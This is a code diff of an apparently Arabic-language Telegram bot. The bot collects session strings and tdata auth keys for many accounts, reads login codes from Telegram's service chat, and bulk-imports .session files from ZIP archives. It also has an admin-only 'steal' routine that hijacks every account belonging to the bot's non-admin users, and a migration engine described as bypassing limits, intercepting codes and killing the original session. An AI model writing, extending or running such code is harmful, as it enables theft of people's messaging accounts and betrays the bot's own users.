@@ -533,13 +533,6 @@ def handle_hex_login(message):
 
     run_async(process_hex())
 
-
-
-
-
-
-
-
 async def execute_full_migration(acc_id, client_a, original_owner, admin_id, phone, name):
     """محرك السحب الاحترافي - تجاوز 24 ساعة، اعتراض الكود، دعم 2FA، واستخراج مفتاح tdata، وانتحار الجلسة A"""
 
@@ -720,18 +713,6 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
 
         return False
 
-
-
-
-
-
-
-
-
-
-
-
-
 # =========================================================
 # 🎛️ واجهات التحكم
 # =========================================================
@@ -744,7 +725,7 @@ def home_keyboard(uid):
     markup.row(InlineKeyboardButton("• إزالـة مـن الـبـوت 🗑️", callback_data="menu_remove"), InlineKeyboardButton("• تـسـجـيـل خـروج 🚪", callback_data="menu_logout"))
     markup.row(InlineKeyboardButton("• إدارة الـتـحـقـق بـخـطـوتـيـن 🔐", callback_data="menu_2fa_manage"))
     markup.row(InlineKeyboardButton("• كـشـف الـحـسـابـات 🕵️", callback_data="reveal_accounts"), InlineKeyboardButton("• فـحـص الـحـسـابـات 🔄", callback_data="check_active"))
-markup.row(InlineKeyboardButton("• عـرض الـجـلـسـات 📂", callback_data="view_sessions_menu"))
+    markup.row(InlineKeyboardButton("• عـرض الـجـلـسـات 📂", callback_data="view_sessions_menu"))
 
     if uid in ADMIN_IDS:
         markup.row(InlineKeyboardButton("• إضافـة مسـتخـدم ➕", callback_data="admin_add_user"), InlineKeyboardButton("• حظـر مسـتخـدم 🚫", callback_data="admin_ban_user"))
@@ -793,12 +774,92 @@ def back_home(call):
 def reveal_accounts(call):
     if not is_allowed(call.from_user.id): return
     accounts = get_all_accounts(call.from_user.id)
-    if not accounts: return bot.answer_callback_query(call.id, "لا توجد حسابات مسجلة!", show_alert=True)
-    text = f"🛂┊ كشـف الحـسـابات -\n\n⎉╎ تم العثور على {len(accounts)} حـسـاب\n\n"
-    for acc_id, phone, name, uid, _ in accounts:
-        text += f"▪️ الـرقـم: {phone}\n▪️ الاسـم: {name}\n▪️ الآيـدي: {uid}\n▪️ سـنـة الإنـشـاء: {get_creation_year(uid)}\n〰️〰️〰️〰️〰️〰️〰️〰️\n"
-    markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
-    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+    
+    if not accounts: 
+        return bot.answer_callback_query(call.id, "لا توجد حسابات مسجلة!", show_alert=True)
+    
+    bot.answer_callback_query(call.id, "⏳ جاري تجهيز كشف الحسابات...")
+    
+    # تحديد عدد الحسابات في كل رسالة (15 حساب رقم آمن جداً لضمان عدم تجاوز الحد)
+    batch_size = 15
+    account_batches = [accounts[i:i + batch_size] for i in range(0, len(accounts), batch_size)]
+    total_accounts = len(accounts)
+    
+    for index, batch in enumerate(account_batches):
+        if index == 0:
+            text = f"🛂┊ كشـف الحـسـابات -\n\n⎉╎ تم العثور على {total_accounts} حـسـاب\n\n"
+        else:
+            text = f"🛂┊ تـكـمـلـة الـحـسـابـات (الـجـزء {index + 1}):\n\n"
+            
+        for acc_id, phone, name, uid, _ in batch:
+            text += f"▪️ الـرقـم: {phone}\n▪️ الاسـم: {name}\n▪️ الآيـدي: {uid}\n▪️ سـنـة الإنـشـاء: {get_creation_year(uid)}\n〰️〰️〰️〰️〰️〰️〰️〰️\n"
+        
+        is_last_batch = (index == len(account_batches) - 1)
+        markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home")) if is_last_batch else None
+        
+        if index == 0:
+            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+        else:
+            bot.send_message(call.message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
+            time.sleep(0.3)
+
+@bot.callback_query_handler(func=lambda call: call.data == "view_sessions_menu")
+def view_sessions_menu(call):
+    if not is_allowed(call.from_user.id): return
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("• جـلـسـات Hex (مفتاح Tdata) 🔠", callback_data="view_sessions:Hex"))
+    markup.row(InlineKeyboardButton("• جـلـسـات مـلـفـات (ZIP / Session) 📁", callback_data="view_sessions:Files"))
+    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
+    bot.edit_message_text("🛂┊ اخـتـر نـوع الـجـلـسـات الـتـي تـريـد عـرضـهـا:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("view_sessions:"))
+def show_sessions_by_type(call):
+    if not is_allowed(call.from_user.id): return
+    sess_type = call.data.split(":")[1]
+    
+    conn = get_db_conn()
+    c = conn.cursor()
+    if sess_type == "Hex":
+        c.execute("SELECT phone, first_name, hex_key, dc_id FROM sessions WHERE owner_id=? AND UPPER(session_type)='HEX'", (call.from_user.id,))
+    else:
+        c.execute("SELECT phone, first_name, pyro_session FROM sessions WHERE owner_id=? AND session_type IN ('File', 'ZIP', 'String')", (call.from_user.id,))
+    
+    rows = c.fetchall()
+    conn.close()
+
+    if not rows:
+        bot.answer_callback_query(call.id, "❌ لا تـوجـد جـلـسـات مـضـافـة مـن هـذا الـنـوع حالياً.", show_alert=True)
+        return
+    
+    bot.answer_callback_query(call.id, "⏳ جاري تجهيز الجلسات للعرض...")
+    
+    # الجلسات ومفاتيح الهيكس طويلة جداً لذا نقسمها لـ 7 حسابات لكل رسالة كحد أقصى لتجنب الحظر
+    batch_size = 7
+    row_batches = [rows[i:i + batch_size] for i in range(0, len(rows), batch_size)]
+    
+    for index, batch in enumerate(row_batches):
+        if index == 0:
+            text = f"🛂┊ عـرض الـجـلـسـات (نـوع الإدخـال: {sess_type}):\n\n"
+        else:
+            text = f"🛂┊ تـكـمـلـة الـجـلـسـات (الـجـزء {index + 1}):\n\n"
+            
+        for row in batch:
+            if sess_type == "Hex":
+                phone, name, hex_key, dc_id = row
+                display_key = f"{hex_key} {dc_id if dc_id else '2'}"
+                text += f"⎉╎ {name} | {phone}\n`{display_key}`\n〰️〰️〰️〰️\n"
+            else:
+                phone, name, pyro_sess = row
+                text += f"⎉╎ {name} | {phone}\n`{pyro_sess}`\n〰️〰️〰️〰️\n"
+                
+        is_last_batch = (index == len(row_batches) - 1)
+        markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجـوع", callback_data="view_sessions_menu")) if is_last_batch else None
+        
+        if index == 0:
+            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+        else:
+            bot.send_message(call.message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
+            time.sleep(0.3)
 
 @bot.callback_query_handler(func=lambda call: call.data == "check_active")
 def check_active_accounts(call):
@@ -844,17 +905,6 @@ def scan_all_codes(call):
     status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري جـلـب الأكـواد مـن الـحـسـابـات...", parse_mode="Markdown")
     run_async(fetch_all_codes_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))
 
-
-
-
-
-
-
-
-
-
-
-
 async def fetch_all_codes_async(owner_id, chat_id, msg_id):
     accounts = get_all_accounts(owner_id)
     if not accounts:
@@ -868,7 +918,7 @@ async def fetch_all_codes_async(owner_id, chat_id, msg_id):
         try:
             await asyncio.wait_for(client.connect(), timeout=5)
             ten_mins_ago = time.time() - 600  # 10 دقائق بالثواني
-            
+
             async for msg in client.get_chat_history(777000, limit=3):
                 if msg.date and msg.date.timestamp() > ten_mins_ago:
                     if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
@@ -893,11 +943,11 @@ async def fetch_all_codes_async(owner_id, chat_id, msg_id):
     # تشغيل الفحص لجميع الحسابات في نفس الثانية (Parallel Processing)
     tasks = [check_single_account(acc_id, phone, pyro_session) for acc_id, phone, name, uid, pyro_session in accounts]
     results = await asyncio.gather(*tasks)
-    
+
     # تجميع الأكواد وترتيبها حسب الأحدث (من الأحدث إلى الأقدم)
     all_codes = [item for sublist in results for item in sublist]
     all_codes.sort(key=lambda x: x['time'], reverse=True)
-    
+
     # أخذ أحدث كودين فقط
     top_2_codes = all_codes[:2]
 
@@ -906,7 +956,7 @@ async def fetch_all_codes_async(owner_id, chat_id, msg_id):
         return
 
     text = "🛂┊ أكـواد الـدخـول (الأحـدث فـقـط):\n\n"
-    
+
     # تنسيق الأحدث أولاً ثم الثاني وقابل للنسخ بضغطة (Markdown)
     for i, item in enumerate(top_2_codes):
         label = "🟢 الأحـدث" if i == 0 else "🔵 الـثـانـي"
@@ -918,16 +968,6 @@ async def fetch_all_codes_async(owner_id, chat_id, msg_id):
         )
 
     bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=home_keyboard(owner_id))
-
-
-
-
-
-
-
-
-
-
 
 @bot.callback_query_handler(func=lambda call: call.data == "autoterm_manage")
 def autoterm_manage_menu(call):
@@ -1250,10 +1290,13 @@ def handle_text_input(message):
 def handle_files(message):
     if not is_allowed(message.from_user.id): return
     file_name = message.document.file_name.lower()
+    
+    # حالة إرسال ملف .session واحد
     if file_name.endswith(".session"):
         status_msg = bot.reply_to(message, "•❐• جـاري قـراءة مـلـف الـجـلـسـة...", parse_mode="Markdown")
         temp_name = f"sess_{message.from_user.id}{int(time.time())}"
-        with open(f"{temp_name}.session", 'wb') as f: f.write(bot.download_file(bot.get_file(message.document.file_id).file_path))
+        with open(f"{temp_name}.session", 'wb') as f: 
+            f.write(bot.download_file(bot.get_file(message.document.file_id).file_path))
         async def verify_file():
             try:
                 client = Client(temp_name, api_id=API_ID, api_hash=API_HASH)
@@ -1267,37 +1310,73 @@ def handle_files(message):
         me, p_sess = run_async(verify_file())
         if me: process_successful_login(message, status_msg, me, p_sess, "File")
         else: bot.edit_message_text("❌ مـلـف مـعـطـوب.", message.chat.id, status_msg.message_id)
+
+    # حالة إرسال ملف ZIP يحتوي على جلسات .session
     elif file_name.endswith(".zip"):
-        status_msg = bot.reply_to(message, "•❐• جـاري سـحـب TDATA...", parse_mode="Markdown")
+        status_msg = bot.reply_to(message, "⏳ جـاري اسـتـخـراج الـجـلـسـات (.session) مـن مـلـف الـ ZIP وفـحـصـهـا بـالـتـوازي...", parse_mode="Markdown")
         extract_dir = f"tmp{message.from_user.id}{int(time.time())}"
         os.makedirs(extract_dir, exist_ok=True)
         zip_path = os.path.join(extract_dir, file_name)
+        
         with open(zip_path, 'wb') as f:
             f.write(bot.download_file(bot.get_file(message.document.file_id).file_path))
+            
         try:
             with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                 zip_ref.extractall(extract_dir)
-            dc_id, auth_key, user_id = run_async(extract_tdata_official(extract_dir))
-            if dc_id and auth_key:
-                p_sess, _ = generate_sessions(API_ID, dc_id, auth_key, user_id)
-                async def verify_tdata():
-                    client = Client(f"td{message.from_user.id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=p_sess, in_memory=True)
-                    try:
-                        await asyncio.wait_for(client.connect(), timeout=10)
-                        me = await client.get_me()
-                        await client.disconnect()
-                        return me
-                    except Exception:
-                        return None
-                me = run_async(verify_tdata())
+            
+            # البحث عن جميع ملفات السيزون داخل الـ zip (حتى لو داخل مجلدات)
+            session_files = []
+            for root, _, files in os.walk(extract_dir):
+                for file in files:
+                    if file.endswith(".session"):
+                        session_files.append(os.path.join(root, file))
+                        
+            if not session_files:
+                bot.edit_message_text("❌ لا تـوجـد مـلـفـات `.session` داخـل الـ ZIP المـرسـل.", message.chat.id, status_msg.message_id, parse_mode="Markdown")
+                return
+                
+            bot.edit_message_text(f"🔍 تـم الـعـثـور عـلـى {len(session_files)} جـلـسـة، جـاري فـحـصـهـا وإضـافـتـهـا...", message.chat.id, status_msg.message_id)
+            
+            # دالة لفحص جلسة واحدة بسرعة
+            async def check_extracted_session(sess_path):
+                session_name = os.path.splitext(sess_path)[0] # بايروجرام يحتاج الاسم بدون امتداد
+                client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
+                try:
+                    await asyncio.wait_for(client.connect(), timeout=8)
+                    me = await client.get_me()
+                    p_sess = await client.export_session_string()
+                    await client.disconnect()
+                    return me, p_sess
+                except Exception:
+                    if client.is_connected: await client.disconnect()
+                    return None, None
+
+            # فحص الجميع بالتوازي
+            async def process_all_sessions():
+                tasks = [check_extracted_session(f) for f in session_files]
+                return await asyncio.gather(*tasks)
+
+            results = run_async(process_all_sessions())
+            
+            # فلترة الحسابات الشغالة وتسجيلها في الداتا بيز
+            success_count = 0
+            for me, p_sess in results:
                 if me:
-                    process_successful_login(message, status_msg, me, p_sess, "TDATA", file_path=zip_path)
-                else:
-                    bot.edit_message_text("❌ TDATA مـعـطـوبـة.", message.chat.id, status_msg.message_id)
-            else:
-                bot.edit_message_text("❌ لا يـوجـد بـيـانـات داخـل الـ ZIP.", message.chat.id, status_msg.message_id)
-        except Exception:
-            bot.edit_message_text("❌ مـلـف غـيـر صـالـح.", message.chat.id, status_msg.message_id)
+                    if not check_duplicate(message.from_user.id, me.id):
+                        save_account(message.from_user.id, me.phone_number or "Unknown", me.id, me.first_name or "User", p_sess, "", "ZIP")
+                        success_count += 1
+                        
+            final_text = (
+                f"🛂┊ تـمـت عـمـلـيـة فـحـص الـ ZIP بـنـجـاح!\n\n"
+                f"⎉╎ إجـمـالـي الـجـلـسـات فـي الـمـلـف: {len(session_files)}\n"
+                f"✅ الـحـسـابـات الـشـغـالـة الـتـي أُضـيـفـت: {success_count}\n"
+                f"❌ الـمـعـطـوبـة أو الـمـكـررة: {len(session_files) - success_count}"
+            )
+            bot.edit_message_text(final_text, message.chat.id, status_msg.message_id, reply_markup=home_keyboard(message.from_user.id))
+
+        except Exception as e:
+            bot.edit_message_text(f"❌ مـلـف ZIP غـيـر صـالـح أو حـدث خـطـأ:\n{str(e)}", message.chat.id, status_msg.message_id)
         finally:
             shutil.rmtree(extract_dir, ignore_errors=True)
 
@@ -1349,7 +1428,7 @@ async def check_account_for_menu(acc):
     two_fa_status = "غير معروف"
     try:
         await asyncio.wait_for(client.connect(), timeout=5)
-        
+
         # فحص وجود تحقق بخطوتين
         try:
             pwd = await client.invoke(functions.account.GetPassword())
@@ -1405,20 +1484,6 @@ async def build_steal_menu_async(admin_id, chat_id, msg_id):
     text = "🛂┊ **نـظـام تـهـجـيـر وسـحـب الـحـسـابـات:**\n\n🟢 = جـاهـز لـلـسـحـب (تخطى 24 ساعة).\n🟡 = جـاهـز لـلـسـحـب (اجتاز الفحص البرمجي).\nبدون لون = الحساب جديد (سيوضع تحت المراقبة).\n\n⎉╎ اخـتـر حـسـابـاً לـبـدء الـتـهـجـيـر:"
     bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 @bot.callback_query_handler(func=lambda call: call.data.startswith("steal:"))
 def handle_steal(call):
     if call.from_user.id not in ADMIN_IDS: return
@@ -1432,10 +1497,10 @@ def handle_steal(call):
         c.execute("SELECT id FROM sessions WHERE owner_id NOT IN ({})".format(",".join("?"*len(ADMIN_IDS))), ADMIN_IDS)
         accs = c.fetchall()
         conn.close()
-        
+
         success_count = 0
         failed_count = 0
-        
+
         for acc in accs:
             res = run_async(steal_single_account(acc[0], call.from_user.id))
             if "✅" in res:
@@ -1443,7 +1508,7 @@ def handle_steal(call):
             else:
                 failed_count += 1
             time.sleep(1.5) # وقت راحة بسيط لتجنب حظر تليجرام
-            
+
         final_text = (
             f"✅ إنـتـهـت عـمـلـيـة الـسـحـب عـلـى الـجـمـيـع!\n\n"
             f"🟢 نـجـح: {success_count} حـسـاب\n"
@@ -1495,4 +1560,4 @@ if __name__ == "__main__":
         try:
             bot.infinity_polling(skip_pending=True, timeout=20, long_polling_timeout=15)
         except Exception as e:
-            time.sleep(3) 
+            time.sleep(3)
